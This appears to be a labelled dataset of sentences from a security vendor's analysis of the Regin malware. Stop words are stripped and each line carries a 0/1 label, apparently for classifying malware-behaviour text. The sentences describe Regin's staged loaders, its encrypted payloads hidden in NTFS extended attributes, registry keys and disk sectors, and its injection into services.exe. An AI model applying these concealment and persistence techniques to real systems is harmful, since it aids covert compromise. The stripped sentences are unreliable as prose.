The later stages bring Regin 's main payloads play	0
This section presents brief overview format purpose stage	0
The interesting stages executables data files stored Stages 4 5	0
The initial Stage 1 driver plainly visible code computer	0
All stages stored encrypted data blobs file within non-traditional file storage area registry extended attributes raw sectors end disk	1
Symantec Security Response obtained Regin dropper time writing	0
Symantec believes dropper executed target 's computer install execute Stage 1	1
It 's likely Stage 0 responsible setting various extended attributes and/or registry keys values hold encoded versions stages 2 3 potentially stages 4 onwards	1
The dropper could transient rather acting executable file may possibly part infection vector exploit code	0
Stage 1 initial load point threat	1
There two known Stage 1 file names These kernel drivers load execute Stage 2	1
These kernel drivers may registered system service may associated registry key load driver computer starting	1
Stage 1 simply reads executes Stage 2 set NTFS extended attributes	1
If extended attributes found Stage 2 executed set registry keys	1
Stage 2 kernel driver simply extracts installs runs Stage 3	1
Stage 2 stored traditional file system encrypted within extended attribute registry key blob	1
Stage 2 found encrypted This stage also hide running instances Stage 1	1
Once happens remaining plainly visible code artifacts	0
Similar previous stages Stage 2 finds loads encrypted version Stage 3 either NTFS extended attributes registry key blob	1
Stage 2 also monitor state threat	1
This stage drops file msrdc64.dat appears always 512 bytes size	1
The first two bytes used remaining bytes set zero	0
The second byte indicates exclusive maximum number instances allowed run set two	0
This means one instance run time	0
The first byte indicates many instances run attempted run	0
Therefore potential combinations first two bytes Stage 3 kernel mode DLL stored traditional file system	0
Instead file encrypted within extended attribute registry key blob	1
Stage 3 found following locations The file six seven times size driver Stage 2	0
In addition loading executing Stage 4 Stage 3 offers framework higher level stages	1
Stages 3 based modular framework code modules	0
These modules offer functions private custom interface	0
Each file stages 3 '' export '' functionality parts Regin	0
In case Stage 3 following primitives offered These primitives provided custom export methodology	0
The Stage 3 DLL exports wide range functionality custom export methodology	0
The interface used export functionality make use traditional Windows DLL export mechanism name ordinal	0
Exported Regin methods referenced tuple consisting major minor number	0
Stage 3 exports hundreds methods organized 12 different major groups	0
The numbers used vary across versions	0
We acquired artifacts using two different numbering schemes	0
Table 2 example listing	0
With Regin 's modular nature Stage 4 kernel modules Stage 5 user modules ( payloads ) provide functionality export routines using major minor numbering scheme	0
The files Stage 4 loaded Stage 3 consist user-mode orchestrator multiple kernel payload modules	1
They stored two EVFS containers files • % System % \config\SystemAudit.Evt Contains Stage 4 kernel drivers constitute kernel mode part Regin 's payload	0
• % System % \config\SecurityAudit.Evt Contains user mode version Stage 3	0
The files injected services.exe	0
When attackers operated Regin cleaned compromised computers finished often failed remove Stage 4 5 artifacts system	1
Stage 4 also uses export methodology described Stage 3	0
Stage 5 consists main Regin payload functionality	0
The files Stage 5 injected services.exe Stage 4	1
